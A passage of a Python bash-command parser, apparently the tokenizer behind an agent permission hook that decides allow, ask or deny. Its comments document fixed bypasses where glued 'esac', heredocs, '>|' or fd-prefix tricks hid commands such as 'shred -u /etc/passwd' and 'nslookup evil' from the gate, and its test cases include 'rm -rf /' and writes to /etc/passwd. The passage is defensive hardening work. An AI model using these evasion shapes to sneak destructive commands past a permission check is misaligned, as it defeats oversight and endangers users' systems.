            # separators, so they fall through to ordinary word content. The
            # same holds inside a `case` pattern list, where `|` alternates
            # patterns and `<`/`>` are literal pattern characters. The exception
            # is a closing `]]` glued to this operator (e.g. `]];`, `]]|`): it
            # hasn't been flushed yet, so in_conditional is still True — flush it
            # now to end the conditional and let the operator split.
            op = self._check_operator(command, i, _word_glued=word_open)
            if op and in_conditional and ''.join(current) == ']]':
                flush_current()  # flips in_conditional False
            # The same shape for `case`: an `esac` GLUED to a metacharacter.
            # bash lexes `esac` as a word of its own — `<`, `>`, `|`, `&` and
            # `;` all END a word — and in pattern position that word is the
            # reserved word that closes the statement. Operator detection is
            # suppressed in pattern mode, so without this flush the buffer grew
            # to `esac<x`, the state machine never saw a bare `esac`, the case
            # stayed open, and every separator to end of input was swallowed:
            # `case a in esac<x ; shred -u /etc/passwd` decided ALLOW while
            # bash ran `shred` (task 32 round 5, item 4; the `<<<` spelling of
            # the same hole is closed by the heredoc branch's flush above).
            #
            # Only `esac` gets this: measured, `case a in a<b ; …` and
            # `case a in a<<b ; …` are bash SYNTAX ERRORS — nothing runs — so
            # no other pattern word can hide a command this way, and flushing
            # them would start splitting patterns bash keeps whole.
            if op and in_case_pattern and ''.join(current) == 'esac':
                flush_current()  # runs the state machine, popping the `case`
                in_case_pattern = bool(case_stack) and case_stack[-1] == 'pattern'
            if op and not in_conditional and not in_case_pattern:
                flush_current()
                # Classify operator as OP or REDIRECT
                if self._is_redirect(op):
                    tokens.append(('REDIRECT', op, i))
                else:
                    emit_separator(op, i)
                i += len(op)
                continue

            # Handle comments - skip from # to end of line (when not in quotes).
            #
            # A `#` only starts a comment at a WORD BOUNDARY. bash: "A word
            # beginning with # causes that word and all remaining characters on
            # that line to be ignored" — beginning with, not containing. Mid-word
            # it is an ordinary character, so `echo ok#c`, `echo a#b#c` and
            # `url=http://x/#frag` all keep their tail and the line continues.
            #
            # `not current and not word_open` is exactly "at the start of a
            # word": `current` covers the ordinary case, `word_open` covers the
            # one shape where the buffer is empty mid-word (a glued `$(...)`,
            # backtick or `<(...)` was lifted into its own token). An escaped or
            # quoted `#` never reaches here at all — `\#` is consumed by the
            # escape branch and a quoted one by the in_quote branch — and an
            # escaped space keeps `current` non-empty, so `echo a\ #b` stays one
            # word, as in bash.
            #
            # Before this gate (task 32 §1b) ANY unquoted `#` ate the rest of the
            # line, so `echo ok#c ; nslookup evil` was reported as the single
            # sub-command `echo ok` and the tail was never classified.
            if char == '#' and in_quote is None and not current and not word_open:
                # Skip everything until end of line
                while i < len(command) and command[i] != '\n':
                    i += 1
                # Don't skip the newline itself - let the newline handler process it
                continue

            # Whitespace separates tokens (including newlines)
            if char in (' ', '\t'):
                flush_current()
                i += 1
                continue

            # Newline handling
            if char == '\n':
                flush_current()
                # The newline that immediately follows a heredoc operator begins
                # the heredoc body — it transitions us into content mode and is
                # NOT a command separator.
                if heredoc_delimiter is not None and not heredoc_seen_first_nl:
                    heredoc_seen_first_nl = True
                    i += 1
                    # ...and the FIRST body line has to be tested for the
                    # terminator right here. Content mode only ever tested a
                    # line reached after a SUBSEQUENT newline, so a heredoc
                    # whose terminator is its first body line — `cat <<E\nE\n`,
                    # the shortest legal heredoc — never closed and swallowed
                    # every command after it: `cat <<E\nE\nshred git status`
                    # decided allow with sub-commands `['cat']`
                    # (task 32 round 5, item 3).
                    end = closes_heredoc(i)
                    if end is not None:
                        i = end
                        heredoc_delimiter = None
                    continue
                # An unquoted newline separates commands, just like ';'.
                # (Quoted, escaped/continuation, heredoc, and command-subst
                # newlines are handled before reaching this point.)
                emit_separator(';', i)
                i += 1
                continue

            # Regular character
            current.append(char)
            i += 1

        # Flush final token
        flush_current()

        # An UNTERMINATED `[[` (task 32 §3a). bash rejects such a command
        # outright — `bash -c '[[ -f x ; nslookup evil'` is a syntax error and
        # NOTHING runs — so no split we produce here can be unfaithful to what
        # executes. What we must not do is keep the suppression: it swallows
        # every separator from the `[[` to the end of the string, and the only
        # thing standing between that and a bypass would be our own `]]`
        # detection being exactly as good as bash's. Re-tokenize with the
        # conditional disabled instead, which surfaces the hidden commands and
        # so fails toward `ask`. Clearing the flag at the next separator was the
        # alternative and is wrong: it reopens the hole for a genuine
        # `[[ a && b ]]`.
        if in_conditional and _allow_conditional:
            return self._tokenize_with_quotes(command, _allow_conditional=False,
                                              _depth=_depth)

        return tokens

    def _at_reserved_word_position(self, tokens, recorded) -> bool:
        """Would bash read a RESERVED WORD as the next token appended here?

        A total function of the LAST EMITTED TOKEN's type, over the five types
        this tokenizer ever appends:

            (no tokens)                      True   start of input
            OP                               True   a separator opens a command
            WORD in CMD_POSITION_WORDS       whatever that keyword's own answer
                                                    was — see below
            WORD / ENV / REDIRECT /
            CMD_SUBST / CASE_PATTERN         False  the position is consumed

        `recorded` maps a token's index to the answer given for it, so the
        keyword case is a recurrence rather than a rescan: a keyword is
        transparent only when IT was itself a reserved word. Measured,
        `> /tmp/z if [[ -f x ]]` is `if: command not found`, so an `if` that is
        a redirect TARGET makes the `[[` after it an ordinary argument.

        A WORD with no recorded answer reads as CONSUMED. Nothing reaches that
        today — every WORD is appended by `flush_current`, which records first
        — so it is the safe default for a future path that forgets, not live
        behaviour. `test_the_reserved_word_rule_is_total_over_token_types`
        asserts every branch directly, including the ones the tokenizer cannot
        currently reach; an unobservable branch and an untested one look
        identical otherwise (task 32 §9.6, mutation M13).
        """
        if not tokens:
            return True
        token_type, token_value, _offset = tokens[-1]
        if token_type == 'OP':
            return True  # `;` `&` `&&` `||` `|` and the newline separator
        if token_type == 'WORD' and token_value in self.CMD_POSITION_WORDS:
            return recorded.get(len(tokens) - 1, False)
        return False  # WORD, ENV, REDIRECT, CMD_SUBST, CASE_PATTERN

    def _check_operator(self, command: str, pos: int,
                        _word_glued: bool = False) -> str:
        """
        Check if position starts with an operator

        Args:
            command: Full command string
            pos: Current position

        Returns:
            Operator string if found, empty string otherwise

        THE TABLE IS BASH'S, NOT OURS (task 32 round 4). Every operator this
        function does not know is lexed as a shorter prefix and the remainder
        is re-read — and when the remainder happens to be `|` or `&`, a
        REDIRECTION becomes a SEPARATOR. A separator is an `OP`, and `OP`
        reopens reserved-word position, so the redirect's TARGET becomes a
        place where `[[` is the conditional keyword and every following
        separator is swallowed. Three of task 32's doors were that exact shape:

            cmd &  x        (task 31)  `&` was in no table at all
            cmd >| [[ ; x ]]           `>|` lexed as `>` + spurious OP `|`
            cmd 1>& [[ ; x ]]          `1>` won the scan, leaving OP `&`

        So the list is no longer hand-maintained here: it is
        BASH_OPERATOR_TOKENS, transcribed from bash's grammar and sorted
        longest-first for maximal munch, preceded by FUSED_FD_OPERATORS.
        `test_check_operator_reproduces_bash_word_boundaries` walks bash's
        redirection and list-terminator productions and fails loudly for any
        operator missing from it — an operator the parser does not know cannot
        be enumerated from the parser, which is why three review rounds of
        parser-derived corpora missed `>|` and `1>&`.

        `1>` is deliberately ABSENT. bash has no `1>` operator: it lexes NUMBER
        `1` then `>`, and so do we, via the fd-prefix branch in
        _tokenize_with_quotes. Matching `1>` whole shadowed both `1>&` (bash's
        `&>` synonym — it WRITES the operand) and `1>|`, and additionally made
        `echo x 1>> /etc/passwd` report `>` as its write target instead of the
        path. `2>&1` and `1>&2` remain fused for a different reason — see
        FUSED_FD_OPERATORS.

        A BARE `>&` is reported as `&>` when its operand is a path (task 32).
        In bash `>& word` is an exact synonym for `&> word` — both send stdout
        AND stderr to the file — and only degenerates to fd duplication when
        the operand is a digit run or `-`. Keeping `>&` in every case left
        `cmd >& /tmp/f` parsed as `['cmd /tmp/f']` with NO write target, so the
        write-destination gate could not see `echo x >& /etc/passwd` at all.
        The two spellings are the same length, so returning the synonym also
        keeps the caller's `pos += len(op)` correct.
        """
        # Fused fd+operator spellings first: `2>&1` must beat `2` + `>&`, so
        # the fd digit never leaks out as a word.
        for op in self.FUSED_FD_OPERATORS:
            if command.startswith(op, pos):
                return op

        # bash's operator table, longest match first (maximal munch).
        for op in self.BASH_OPERATOR_TOKENS:
            if command.startswith(op, pos):
                if op == '>&' and self._is_bare_amp_write_redirect(
                        command, pos, _word_glued):
                    return '&>'
                return op

        return ''

    # A bash word-boundary character: anything that cannot be part of a word.
    _METACHARS = frozenset(' \t\n|&;()<>')

    # bash's REDIR_WORD: `{name}` immediately before a redirection operator
    # allocates a file descriptor and stores it in `$name`. Matched only at a
    # token boundary and only when an operator follows (see the fd-prefix
    # branch), so `echo {v}` and `echo {a,b}` stay ordinary words.
    _FD_VARNAME_RE = re.compile(r'\{[A-Za-z_][A-Za-z0-9_]*\}')

    def _is_bare_amp_write_redirect(self, command: str, pos: int,
                                    word_glued: bool = False) -> bool:
        """
        True when the `>&` at `pos` is bash's `&>` synonym rather than an
        fd duplication, i.e. `cmd >& FILE` — stdout AND stderr to a path.

        bash's two rules, both measured:

        1. The `&>`-synonym reading applies to a BARE `>&` and to fd 1 — and
           to nothing else. Measured on bash 5.3, `echo hi N>& TARGETFILE`:

               >&    1>&    01>&   001>&   -> TARGETFILE created
               0>&   00>&   2>&    3>&     -> "ambiguous redirect", no file
               10>&  11>&   {v}>&           -> "ambiguous redirect", no file

           `1>& word` is stdout duplication onto a word, and duplicating
           stdout onto a path IS `&> word` — so bash writes the file, exactly
           as for the bare spelling. Every other fd demands an fd operand and
           fails the whole redirection, so those stay on the fd-dup path.
           The test is on the prefix's VALUE, not its text: `001` is fd 1.

           Before round 4 fd 1 was rejected here and never even reached this
           function — `1>` won the operator scan, so `echo hi 1>& [[ ; shred
           … ]]` lexed as REDIRECT `1>` + OP `&`, and the OP reopened
           reserved-word position for the `[[`. Fd 1 is precisely the fd where
           bash runs the tail AND writes the file.

           The prefix is a *pure numeric word*, so a digit run glued to `>&`
           counts only when what precedes it is a word boundary: `foo3>&bar`
           is the word `foo3` followed by a bare `>&`, exactly as bash reads
           it.
        2. The operand decides: a digit run (`>&2`, `>& 1`) or `-` (`>&-`,
           `>& -`) is fd duplication or fd close, which writes to no path.
           Anything else — `/tmp/f`, `"$LOG"`, `$var` — is the file operand of
           the `&>` synonym.
        """
        # Rule 1: reject an fd-prefixed `n>&`, except fd 1.
        #
        # `word_glued` says the caller is mid-word with an empty buffer because
        # a `$(...)`/`` `...` ``/`<(...)` was just lifted into its own token. The
        # digits are then WORD CONTENT, not an fd token, so there is no prefix:
        # bash writes the file for `echo a $(true)2>&/tmp/f` (measured) while
        # the subshell spelling `(true)2>&/tmp/f` — same `)` in the source, no
        # lift — is an "ambiguous redirect" that writes nothing. The walk-back
        # cannot tell those apart from the text alone, since it accepts `)` as a
        # word boundary; the tokenizer can, and does (task 32 round-2 LOW 2).
        if not word_glued:
            j = pos - 1
            while j >= 0 and command[j].isdigit():
                j -= 1
            if j < pos - 1 and (j < 0 or command[j] in self._METACHARS):
                # An fd prefix. Only fd 1 keeps the `&>`-synonym reading.
                #
                # Compared as TEXT with leading zeros stripped, never through
                # `int()`. CPython refuses to convert a decimal string longer
                # than 4300 digits and raises ValueError, which `main()`'s
                # blanket handler turns into NO DECISION — measured on the real
                # hook path, `("1" * 4301) + ">& f\nshred -u /etc/passwd"`
                # exited 0 with no output where HEAD denied (task 32 round 5,
                # item 5). `'1'`, `'01'`, `'001'` all strip to `'1'`; `'0'`
                # strips to `''` (fd 0, correctly rejected); `'10'` stays
                # `'10'`. No arithmetic, so no length can raise.
                if command[j+1:pos].lstrip('0') != '1':
                    return False

        # Rule 2: inspect the operand.
        k = pos + 2
        while k < len(command) and command[k] in (' ', '\t'):
            k += 1
        end = k
        while end < len(command) and command[end] not in self._METACHARS:
            end += 1
        operand = command[k:end]
        if not operand:
            return False
        return not (operand.isdigit() or operand == '-')

    def _is_redirect(self, op: str) -> bool:
        """Check if operator is a redirection"""
        return op in self.REDIRECTIONS

    # Characters permitted in a value we treat as a substitutable constant.
    # Deliberately narrow: a literal path/word with no shell-active characters
    # (no $ or backtick expansion, no whitespace, no glob *?[]). Expanding only
    # such values can never introduce a command the user did not literally type.
    _CONSTANT_VALUE_RE = re.compile(r'^[A-Za-z0-9_./:@%+,=-]+$')

    @staticmethod
    def is_constant_value(value: str):
        """
        If a `KEY=VALUE` assignment's VALUE is a safe literal constant, return
        the literal (with surrounding quotes stripped); otherwise return None.

        "Safe" means an optionally single/double-quoted literal made only of
        path/word characters — no parameter or command expansion ($, ``), no
        glob (*?[]), no whitespace. Substituting such a value for a later
        `$KEY` merely reveals the command the user already wrote, so it can be
        re-validated normally; it can never hide a command behind a variable.

        Examples:
            '/usr/local/bin/godot' -> '/usr/local/bin/godot'
            '"clang++"'            -> 'clang++'
            '$(which godot)'       -> None   (command substitution)
            'a b'                  -> None   (whitespace)
            '*.txt'               -> None   (glob)
        """
        if value is None:
            return None
        v = value
        if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
            v = v[1:-1]
        if not v or not BashCommandParser._CONSTANT_VALUE_RE.match(v):
            return None
        return v

    def extract_assignments(self, command: str) -> List[Tuple[str, str, int]]:
        """
        Extract standalone variable assignments from a compound command.

        Only `KEY=VALUE` statements that stand alone as a whole sub-command are
        returned — not a `KEY=VALUE cmd` env prefix. The distinction matters:
        a standalone assignment persists for the rest of the script (so later
        `$KEY` uses see it), whereas an env prefix applies to that one command
        only. A group qualifies when it has no WORD token (see below).

        Returns (name, raw_value, offset) tuples in source order. The value is
        raw (quotes intact); callers apply is_constant_value() to decide whether
        it is safe to substitute. The offset is the assignment's source offset,
        used to enforce that a use is only resolved by an assignment that
        lexically precedes it.

        A standalone-assignment group is one whose tokens are only ENV (or the
        CMD_SUBST tokens the tokenizer splits out of a value like
        `X=$(...)`), with no WORD — i.e. it runs no command of its own. Dynamic
        values ARE reported (as their raw, non-constant text) on purpose: a
        later constant-resolution must see that a reassignment like
        `GODOT=$(echo rm)` poisons an earlier `GODOT=/usr/local/bin/godot`,
        otherwise `$GODOT` could be validated against the stale safe path.
        """
        if not command or not command.strip():
            return []
        tokens = self._tokenize_with_quotes(command)
        groups = self._split_on_operators(tokens)
        assignments = []
        for group in groups:
            if not group:
                continue
            # No WORD token => the group assigns variables but runs no command.
            if all(t[0] in ('ENV', 'CMD_SUBST') for t in group) and \
                    any(t[0] == 'ENV' for t in group):
                for t_type, t_val, t_off in group:
                    if t_type != 'ENV':
                        continue
                    name, _sep, value = t_val.partition('=')
                    assignments.append((name, value, t_off))
        return assignments

    @staticmethod
    def _strip_quotes(value: str) -> str:
        """Strip one layer of matching surrounding single/double quotes."""
        v = value
        if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
            v = v[1:-1]
        return v

    def extract_write_redirect_targets(self, command: str) -> List[Tuple[str, int]]:
        """
        Return (target, offset) for every output redirection that WRITES to a
        path, across the whole compound command — recursing into command
        substitutions, whose redirects execute too (`$(evil > /etc/x)`).

        The split/normalize path strips redirects AND their target tokens (see
        _split_on_operators), so the validator otherwise never sees where output
        is written. This surfaces those write targets so a caller can gate them
        by destination.

        One layer of surrounding quotes is stripped from the target; the text is
        otherwise returned verbatim, so an unexpanded `$VAR`/`$(...)` stays
        visible and the caller can refuse to vouch for an unresolvable location.
        Only path-operand writes are returned; fd-dup forms (`2>&1`, `>&`) carry
        no target and are skipped.

        Examples:
            'echo x > /etc/passwd'      -> [('/etc/passwd', 7)]
            'grep x 2>/dev/null'        -> [('/dev/null', 9)]
            'cmd >> "$LOG"'             -> [('$LOG', 7)]
            'a 2>&1 | b'                -> []   (fd-dup, no path)
            'cat < in.txt'             -> []   (read, not a write)
        """
        if not command or not command.strip():
            return []
        return self._scan_write_targets(command)

    def _scan_write_targets(self, command: str,
                            _depth: int = 0) -> List[Tuple[str, int]]:
        tokens = self._tokenize_with_quotes(command, _depth=_depth)
        targets = []
        pending = False  # previous token was a write redirect awaiting its path
        for t_type, t_val, t_off in tokens:
            if pending:
                pending = False
                # The path is the immediately following token. An operator (or a
                # case pattern) here means the redirect had no path operand
                # (malformed `> ;`) — neither names a file, so record nothing and
                # let this token be re-examined as a possible new redirect below.
                if t_type not in ('OP', 'CASE_PATTERN'):
                    targets.append((self._strip_quotes(t_val), t_off))
                    continue
            if t_type == 'REDIRECT' and t_val in self.WRITE_REDIRECTIONS_WITH_ARG:
                pending = True
            elif t_type == 'CMD_SUBST' and t_val.strip():
                if _depth < self.MAX_SUBSTITUTION_DEPTH:
                    targets.extend(self._scan_write_targets(t_val, _depth + 1))
                else:
                    # A redirect we could not look at is not the same as no
                    # redirect. Reporting an unresolvable target makes the
                    # write-destination gate refuse to vouch for it, instead of
                    # reporting NO write target for
                    # `echo A $(… 65 deep … echo x > /etc/passwd …)` — which is
                    # what turned HEAD's `ask` into an `allow`.
                    targets.append((self.TRUNCATED_SUBSTITUTION_TARGET, t_off))
        return targets

    @staticmethod
    def _is_env_prefix(token: str) -> bool:
        """Check if token is an env var assignment prefix (e.g., 'KEY=' or 'KEY=partial')"""
        if not token or '=' not in token or token.startswith('-'):
            return False
        key = token.split('=', 1)[0]
        if not key or not (key[0].isalpha() or key[0] == '_'):
            return False
        return all(c.isalnum() or c == '_' for c in key)

    def _classify_token(self, token: str, offset: int = 0) -> Tuple[str, str, int]:
        """
        Classify token as ENV or WORD

        Args:
            token: Token string
            offset: Source offset where the token began

        Returns:
            (type, value, offset) tuple
        """
        # Check if it's an environment variable (KEY=VALUE format)
        if '=' in token and not token.startswith('-'):
            parts = token.split('=', 1)
            key = parts[0]
            # Valid env var: starts with letter or underscore, followed by alnum/underscore
            if key and (key[0].isalpha() or key[0] == '_'):
                if all(c.isalnum() or c == '_' for c in key):
                    return ('ENV', token, offset)

        return ('WORD', token, offset)

    def _split_on_operators(self, tokens: List[Tuple[str, str]]) -> List[List[Tuple[str, str]]]:
        """
        Split token list on operator boundaries

        Args:
            tokens: List of (type, value) tuples

        Returns:
            List of token groups (one per sub-command)
        """
        groups = []
        current_group = []
        skip_next = False  # Skip next token (redirect argument)

        for token_type, token_value, token_offset in tokens:
            if skip_next:
                # Don't skip operator tokens - they should always split commands
                # (This handles the case where heredoc delimiter is already consumed)
                if token_type != 'OP':
                    # Skip this token (it's the argument to a redirect)
                    skip_next = False
                    continue
                else:
                    # Don't skip the operator, but clear the skip flag
                    skip_next = False

            if token_type == 'OP':
                # Operator splits commands
                if current_group:
                    groups.append(current_group)
                    current_group = []
            elif token_type == 'REDIRECT':
                # Redirections are stripped
                # Only skip next token if this redirect takes an argument
                if token_value in self.REDIRECTIONS_CONSUMING_A_WORD:
                    skip_next = True
            elif token_type == 'CASE_PATTERN':
                # A `case` arm pattern is data matched against a word, not a
                # command — drop it. Any command substitution inside it was
                # emitted as its own CMD_SUBST token and is still validated.
                continue
            else:
                # Regular token or ENV var
                current_group.append((token_type, token_value, token_offset))

        # Flush final group
        if current_group:
            groups.append(current_group)

        return groups

    def _normalize_command(self, tokens: List[Tuple[str, str]]) -> str:
        """
        Convert tokens back to normalized command string

        - Strips environment variables
        - Strips grouping parentheses left behind by subshell syntax
        - Joins remaining tokens with spaces
        - Normalizes whitespace

        Args:
            tokens: List of (type, value) tuples for a single command

        Returns:
            Normalized command string
        """
        # Strip leading environment variables
        words = []
        skip_env = True  # Skip env vars at the beginning

        for token_type, token_value, _token_offset in tokens:
            if skip_env and token_type == 'ENV':
                # Skip leading environment variables
                continue
            else:
                # Once we hit a non-ENV token, stop skipping
                skip_env = False
                if token_type in ('WORD', 'QUOTED'):
                    words.append(token_value)

        # Join and normalize whitespace
        result = ' '.join(words).strip()
        # Bash arithmetic compound command: (( expr )) — preserve the (( prefix
        # so _reduce_to_effective_command in pretool_hook can recognise it as a
        # no-op. Without this guard, _strip_grouping_tokens would peel both layers
        # of parens and leave a dangling token like `passed++` that matches no
        # allow pattern.
        if result.startswith('(('):
            return result
        return self._strip_grouping_tokens(result)

    def _strip_grouping_tokens(self, command: str) -> str:
        """
        Remove shell grouping tokens that can remain at command boundaries.

        The parser splits on operators like && and |, so a grouped command such
        as `(cd app && npm test)` or `{ git log; git status; }` can leave
        fragments like `(cd app`, `{ git log`, `npm test)`, or `}`. Subshell
        `()` and brace-group `{}` tokens do not change the command being
        validated, so strip them before matching permission patterns.

        Subshell '(' / ')' and brace-group '{' / '}' are handled differently
        because bash treats them differently:

        - '(' and ')' are metacharacters that self-delimit, so they glue to
          adjacent words ("(cd app", "head -40)"). We strip them even when glued.
        - '{' and '}' are reserved words recognized as a group ONLY when they
          are standalone tokens ("{ cmd; }"). A '{' or '}' glued to a word is
          brace/parameter expansion ("{a,b}", "${HOME}", "${arr[@]}") and must
          be left intact. So we strip braces only when they are whole tokens.

        Parens remain imperfect for glued non-grouping uses (arithmetic
        "$((1+2))", extglob "@(a|b)"); fully resolving those needs paren-depth
        tracking in the tokenizer, not string stripping. Case-arm patterns are
        no longer among them — the tokenizer recognizes `case ... in` and emits
        the pattern list as CASE_PATTERN tokens, which never reach this point.
        """
        if not command:
            return command

        words = command.split()
        if not words:
            return command

        while words:
            first = words[0]
            if first[0] == '(':
                words[0] = first[1:]
                if not words[0]:
                    words.pop(0)
            elif first == '{':
                words.pop(0)
            else:
                break

        while words:
            last = words[-1]
            if last[-1] == ')':
                words[-1] = last[:-1]
                if not words[-1]:
                    words.pop()
            elif last == '}':
                words.pop()
            else:
                break

        return ' '.join(words).strip()


# For testing
if __name__ == '__main__':
    import sys

    parser = BashCommandParser()

    # Test cases
    test_cases = [
        ("git status", ["git status"]),
        ("git diff | head -100", ["git diff", "head -100"]),
        ("GIT_PAGER=cat git diff", ["git diff"]),
        ("A=1 B=2 ./script.sh", ["./script.sh"]),
        ("npm install && npm test", ["npm install", "npm test"]),
        ("git diff > out.txt 2>&1", ["git diff"]),
        ('echo "foo | bar"', ['echo "foo | bar"']),
        ("cmd1 || cmd2", ["cmd1", "cmd2"]),
        # A bare `&` separates commands: `cmd1 & cmd2` runs BOTH (task 31).
        ("echo ok & nslookup example.com", ["echo ok", "nslookup example.com"]),
        ("echo ok& nslookup example.com", ["echo ok", "nslookup example.com"]),
        ("a & b & c", ["a", "b", "c"]),
        ("sleep 1 &", ["sleep 1"]),           # trailing `&`: one command, no empty tail
        ("cmd &> /tmp/f", ["cmd"]),           # `&>` is a redirection, not a separator
        ("cmd &>> /tmp/f", ["cmd"]),
        ("echo 'a & b'", ["echo 'a & b'"]),   # quoted `&` is data
        ("ls -la | grep foo | wc -l", ["ls -la", "grep foo", "wc -l"]),
        ("PATH=\"\" ./script.sh", ["./script.sh"]),
        ("git diff activecdn-module/handler.go 2>&1 | head -100", ["git diff activecdn-module/handler.go", "head -100"]),
        ("GIT_PAGER=cat git diff activecdn-module/handler.go 2>&1 | head -100", ["git diff activecdn-module/handler.go", "head -100"]),
        # Heredoc tests
        ('cat << "EOF" | python3\nimport json\nprint("hello")\nEOF', ["cat", "python3"]),
        ('cat << \'EOF\' | python3\nimport json\nprint("hello")\nEOF', ["cat", "python3"]),
        ('cat <<EOF | grep foo\nbar\nbaz\nEOF', ["cat", "grep foo"]),
        # Multi-line pipeline
        ('git diff |\nhead -10', ["git diff", "head -10"]),
        ('ls -la |\ngrep foo', ["ls -la", "grep foo"]),
        # Line continuation
        ('ls -la \\\n| grep foo', ["ls -la", "grep foo"]),
        ('echo "hello" \\\n| wc -l', ['echo "hello"', 'wc -l']),  # Quotes preserved
        # Comments
        ('# this is a comment\ncurl -s http://example.com', ["curl -s http://example.com"]),
        ('# comment\necho foo # inline comment', ["echo foo"]),  # Inline comment stripped
        ('echo "# not a comment"', ['echo "# not a comment"']),  # # in quotes is not a comment
        # Command substitution
        ('VAR=$(curl -s http://example.com)', ["curl -s http://example.com"]),
        ('VAR=$(curl -s url | jq .)', ["curl -s url", "jq ."]),
        ('echo $(cat file.txt)', ["echo", "cat file.txt"]),
        ('RESULT=`grep foo file.txt`', ["grep foo file.txt"]),  # Backtick syntax
        ('VAR=$(nested $(echo inner))', ["nested", "echo inner"]),  # Nested (outer found first)
        # Env var with command substitution and path continuation
        ('GOWORK=$(pwd)/go.work go build ./...', ["go build ./...", "pwd"]),
        ('GOWORK=$(pwd)/go.work go build ./activecdn-module/... ./caddy-apps/... 2>&1 | head -60', ["go build ./activecdn-module/... ./caddy-apps/...", "head -60", "pwd"]),
        ('RESULT=`grep foo file.txt` echo bar', ["echo bar", "grep foo file.txt"]),
        ('PATH=$(dirname $0)/bin:$PATH python app.py', ["python app.py", "dirname $0"]),
        ('(cd apps/contributor && npx tsc --noEmit 2>&1 | head -40) && echo "---PRESENTATION---" && (cd apps/presentation && npx tsc --noEmit 2>&1 | head -40)', ["cd apps/contributor", "npx tsc --noEmit", "head -40", 'echo "---PRESENTATION---"', "cd apps/presentation", "npx tsc --noEmit", "head -40"]),
        ('(git status; git diff | head -20)', ["git status", "git diff", "head -20"]),
        # Brace group with redirection (strip standalone { and } grouping tokens)
        ('cd /tmp; { git log --oneline -3; echo "===STATUS==="; git status -s; } 2>&1', ["cd /tmp", "git log --oneline -3", 'echo "===STATUS==="', "git status -s"]),
        ('{ git status; git diff | head -20; }', ["git status", "git diff", "head -20"]),
        # Brace expansion / parameter expansion must NOT be stripped (not standalone)
        ('cp file.{txt,bak} /tmp', ["cp file.{txt,bak} /tmp"]),
        # Unquoted newlines split commands (like ';')
        ('echo foo\necho bar', ["echo foo", "echo bar"]),
        ('cd /tmp\nls -la\ngit status', ["cd /tmp", "ls -la", "git status"]),
        ('echo foo\n\n\necho bar', ["echo foo", "echo bar"]),  # Blank lines collapse
        ('\necho foo\n', ["echo foo"]),  # Leading/trailing newlines ignored
        # Newlines inside quotes are NOT separators (stays one sub-command;
        # internal whitespace is collapsed by normalization, as always)
        ('echo "line1\nline2"', ['echo "line1 line2"']),
        # if/then/else/fi one-liner spread across lines
        ('if git diff --quiet; then echo clean; else echo dirty; fi',
         ["if git diff --quiet", "then echo clean", "else echo dirty", "fi"]),
        ('if git diff --quiet\nthen echo clean\nfi',
         ["if git diff --quiet", "then echo clean", "fi"]),
        # Multi-line diagnostic script (the real-world failing case)
        ('echo "A:"\nls src/ | grep foo\necho "B:"\ngit ls-files | grep bar || echo none',
         ['echo "A:"', "ls src/", "grep foo", 'echo "B:"', "git ls-files", "grep bar", "echo none"]),
        # A command after a heredoc must not merge into the heredoc command
        ('cat <<EOF\nline\nEOF\necho done', ["cat", "echo done"]),
        ('cat <<EOF\nbody\nEOF\nls -la | grep foo', ["cat", "ls -la", "grep foo"]),
        # Brace GROUPS (standalone { } tokens) are stripped
        ('{ git log; git status; }', ["git log", "git status"]),
        ('{ echo hi; }', ["echo hi"]),
        # Brace/parameter EXPANSION (glued braces) is NOT stripped
        ('echo {a,b}', ["echo {a,b}"]),
        ('echo ${HOME}', ["echo ${HOME}"]),
        ('echo "${arr[@]}"', ['echo "${arr[@]}"']),
        ('ls foo{1,2}.txt', ["ls foo{1,2}.txt"]),
        # Subshell parens still strip even when glued
        ('(cd app && npm test)', ["cd app", "npm test"]),
        # Inside [[ ]] conditionals, &&/||/|/<> are expression operators, not
        # command separators/redirections — the whole test stays one sub-command.
        ('[[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]',
         ['[[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]']),
        ('[[ -f a && -f b ]]', ["[[ -f a && -f b ]]"]),
        ('[[ "$a" > "$b" ]]', ['[[ "$a" > "$b" ]]']),  # > is comparison, not redirect
        # A connector AFTER the closing ]] still splits normally.
        ('[[ -f x ]] || echo missing', ["[[ -f x ]]", "echo missing"]),
        ('if [[ "$a" == b || "$a" == c ]]; then echo hi; fi',
         ['if [[ "$a" == b || "$a" == c ]]', "then echo hi", "fi"]),
        # Command substitution inside [[ ]] is STILL extracted and validated.
        ('[[ $(rm -rf /) ]] || echo hi', ["[[ ]]", "echo hi", "rm -rf /"]),
        # A literal `)` inside a quoted regex bracket class must NOT close the
        # enclosing $(...) early. Before the quote-tracking fix, `[^)]` desynced
        # the tokenizer and stranded later tokens as bogus sub-commands.
        ('n=$(grep -oE "pos=\\([^)]*\\)" file | wc -l)',
         ['grep -oE "pos=\\([^)]*\\)" file', "wc -l"]),
        # The whole double-quoted arg stays one token, and `${v:0:14}` is NOT
        # stranded as a bogus standalone sub-command. The `$(basename $f)` is a
        # real command substitution that bash runs even inside double quotes, so
        # it is correctly extracted for validation.
        ('echo "$(basename $f) ${v:0:14}"',
         ['echo "$(basename $f) ${v:0:14}"', 'basename $f']),
        # Command substitution inside DOUBLE quotes is recognized: an inner `"`
        # must not flip the surrounding quote state. The real-world failing case
        # was a `git commit -m "$(cat <<'EOF' ... )"` whose heredoc body held
        # double quotes and blank lines; the body must not leak out as bogus
        # sub-commands, and the substitution runs only `cat`.
        ('echo "$(grep \"needle\" file)"',
         ['echo "$(grep \"needle\" file)"', 'grep "needle" file']),
        ('git commit -m "$(cat <<\'EOF\'\nfix: thing\n\nthrew "Cannot read\nundefined" here\nEOF\n)"',
         ['git commit -m "$(cat <<\'EOF\' fix: thing threw "Cannot read undefined" here EOF )"',
          'cat']),
        # An UNBALANCED quote in the heredoc body — an apostrophe in `node's` —
        # must not flip quote state inside the `$(...)` scan and mislocate the
        # closing `)`. The real-world failing case leaked the trailing
        # `)" ... git push origin master` back out as a bogus, non-allowlisted
        # sub-command; the body is data, so only `cat` and the following real
        # commands survive.
        ('git commit -m "$(cat <<\'EOF\'\nSmoke test the node\'s own bind IP (best-effort).\nEOF\n)"\ngit push origin master',
         ['git commit -m "$(cat <<\'EOF\' Smoke test the node\'s own bind IP (best-effort). EOF )"',
          'git push origin master',
          'cat']),
        # An unbalanced paren in the heredoc body must not move the depth count
        # and swallow the real closing `)`.
        ('echo "$(cat <<\'EOF\'\na lone ) paren and a ( too\nEOF\n)"\nls',
         ['echo "$(cat <<\'EOF\' a lone ) paren and a ( too EOF )"',
          'ls',
